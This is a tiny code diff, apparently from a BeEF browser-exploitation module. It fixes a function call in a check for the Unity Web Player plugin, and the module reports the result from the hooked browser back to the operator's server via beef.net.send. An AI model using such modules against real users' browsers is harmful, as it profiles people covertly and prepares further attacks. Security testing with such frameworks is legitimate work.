@@ -38,7 +38,7 @@ beef.execute(function() {
 	
 	
 	
-	if ( hasUnity ) {
+	if ( hasUnity() ) {
 		
 		beef.net.send("<%= @command_url %>", <%= @command_id %>, "unity = Unity Web Player is enabled");
 		
